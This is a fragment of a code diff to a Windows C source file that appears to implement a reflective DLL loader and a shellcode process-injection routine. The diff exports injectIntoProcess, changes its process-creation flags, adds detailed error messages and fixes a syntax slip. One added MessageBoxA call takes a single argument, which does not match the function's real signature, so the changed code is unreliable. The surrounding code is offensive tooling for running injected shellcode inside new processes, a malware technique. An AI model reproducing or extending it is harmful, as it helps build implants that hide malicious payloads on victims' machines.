@@ -373,13 +373,15 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     return pEntryPoint;
 }
 
-VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
+DLLEXPORT VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
 {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
     ZeroMemory( &pi, sizeof(pi) );
+
+    MessageBoxA(lpApplicationName);
 
     BOOL success = CreateProcessA
     (
@@ -388,7 +390,7 @@ VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplic
         NULL,                                   // lpProcessAttributes
         NULL,                                   // lpThreadAttributes
         TRUE,                                   // bInheritHandles
-        INHERIT_PARENT_AFFINITY,                // dwCreationFlags
+        0,                                      // dwCreationFlags
         NULL,                                   // lpEnvironment
         NULL,                                   // lpCurrentDirectory
         &si,                                    // lpStartupInfo
@@ -398,7 +400,14 @@ VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplic
     if (!success)
     {
         #ifdef DEBUG
-        MessageBoxA(0, "injectIntoProcess: Process creation failed", "Fail", 0x0L);
+        CHAR buf[256];
+        FormatMessageA
+        (
+            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+            NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
+            buf, (sizeof(buf) / sizeof(CHAR)), NULL
+        );
+        MessageBoxA(0, buf, "Fail", 0x0L);
         #endif
         return;
     }
@@ -428,7 +437,7 @@ VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplic
     WaitForSingleObject( pi.hProcess, INFINITE );
     CloseHandle( pi.hProcess );
     CloseHandle( pi.hThread );
-    return
+    return;
 }
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
